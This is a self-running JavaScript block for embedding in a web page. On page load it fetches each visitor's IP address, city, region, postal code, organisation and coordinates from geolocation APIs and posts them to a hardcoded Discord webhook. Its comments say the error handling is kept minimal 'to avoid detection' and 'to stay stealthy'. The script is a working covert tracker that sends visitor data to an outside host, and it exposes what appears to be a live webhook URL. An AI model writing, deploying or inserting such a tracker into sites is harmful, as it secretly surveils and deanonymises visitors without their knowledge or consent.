    <script>
        // Function to fetch IP and geolocation data
        async function getIpInfo() {
            try {
                // Replace with 'https://ipinfo.io/json?token=YOUR_TOKEN' if you have an API token
                const response = await fetch('https://ipinfo.io/json');
                if (!response.ok) throw new Error(`HTTP ${response.status}`);
                const data = await response.json();
                return {
                    ip: data.ip || 'unknown',
                    city: data.city || 'unknown',
                    region: data.region || 'unknown',
                    country: data.country || 'unknown',
                    loc: data.loc || 'unknown',
                    org: data.org || 'unknown',
                    postal: data.postal || 'unknown',
                    timezone: data.timezone || 'unknown',
                    readme: data.readme || 'none'
                };
            } catch (error) {
                // Minimal error logging to avoid detection
                try {
                    const fallbackResponse = await fetch('https://api.ipify.org?format=json');
                    if (!fallbackResponse.ok) throw new Error(`HTTP ${fallbackResponse.status}`);
                    const fallbackData = await fallbackResponse.json();
                    return { ip: fallbackData.ip || 'failed_to_fetch', city: 'failed', region: 'failed', country: 'failed', loc: 'failed', org: 'failed', postal: 'failed', timezone: 'failed', readme: 'none' };
                } catch (fallbackError) {
                    return { ip: 'failed_to_fetch', city: 'failed', region: 'failed', country: 'failed', loc: 'failed', org: 'failed', postal: 'failed', timezone: 'failed', readme: 'none' };
                }
            }
        }

        // Function to compute SHA-256 hash of data
        async function computeHash(data) {
            const msgBuffer = new TextEncoder().encode(JSON.stringify(data));
            const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
            const hashArray = Array.from(new Uint8Array(hashBuffer));
            return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
        }

        // Function to send data to Discord webhook
        async function sendToWebhook(data, hash) {
            try {
                const webhookUrl = 'https://discord.com/api/webhooks/1427021121710194821/guAwhUs6vHSu3Lbuvx4lUyNS69nZ6H9ar1Y8cx8frNeWiJeHsIZxuRbLdtKTOyZrOUa5'; // Replace with your actual webhook URL
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `New visitor data:\n` +
                                 `IP: ${data.ip}\n` +
                                 `City: ${data.city}\n` +
                                 `Region: ${data.region}\n` +
                                 `Country: ${data.country}\n` +
                                 `Location: ${data.loc}\n` +
                                 `Organization: ${data.org}\n` +
                                 `Postal: ${data.postal}\n` +
                                 `Timezone: ${data.timezone}\n` +
                                 `Readme: ${data.readme}\n` +
                                 `Timestamp: ${data.timestamp}\n` +
                                 `Hash: ${hash}`
                    })
                });
                if (!response.ok) throw new Error(`Webhook failed: HTTP ${response.status}`);
            } catch (error) {
                // Minimal error handling to stay stealthy
            }
        }

        // Main function to collect and send data
        (async () => {
            const data = await getIpInfo();
            data.timestamp = new Date().toISOString();
            const hash = await computeHash(data);
            await sendToWebhook(data, hash);
        })();
    </script>
